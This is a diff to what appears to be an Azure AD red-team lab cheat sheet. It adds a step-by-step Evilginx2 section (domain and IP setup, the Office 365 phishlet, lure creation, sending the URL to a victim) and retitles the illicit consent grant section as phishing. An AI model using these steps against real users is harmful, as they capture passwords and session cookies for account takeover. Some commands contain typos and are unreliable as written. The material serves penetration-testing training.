@@ -90,7 +90,7 @@ Invoke-EnumerateAzureBlobs -Base defcorp -OutputFile azureblobs.txt
 Import-Module .\MSOLSpray.ps1
 ```
 
-## Illicit Consent Grant
+## Illicit Consent Grant phishing
 #### Create a application
 - Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
 - Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
@@ -199,6 +199,54 @@ Invoke-EnumerateAzureBlobs -Base defcorp
 - Access the URL's and see if any files are listed (Example https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list)
 - Access the files by adding it to the url (Example https://defcorpcommon.blob.core.windows.net/backup/blob_client.py)
 - Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blobl container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.
+
+## Phishing Evilginx2
+- https://github.com/kgretzky/evilginx2
+- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.
+
+#### Start evilgix2
+```
+evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
+```
+
+#### Configure the domain
+```
+config domain studentx.corp
+```
+
+#### Set the IP for the evilginx server
+```
+config ip 172.16.x.x
+```
+
+#### Use the template for office365
+```
+phishlets hostname o365 login.studentx.corp
+```
+
+#### Verify the DNS entries
+```
+phishlets get-hosts o365
+```
+
+#### Copy the certificate and private key
+0365.cr and 0365.key from ```C:\studentx\.evilginx\crt to C:\studentx\.evilginx\crt\ login.studentx.corp```
+
+#### Enable phishlets
+```
+phislets enable 0365
+```
+
+#### Create the phishing URL (Tied to an ID)
+```
+lures create 0365
+```
+
+#### Get the phishing URL
+- Share the phishing URL with the victim
+```
+lures get-url <ID>
+```
 
 # Authenticated enumeration
 ## Enumeration through Azure portal
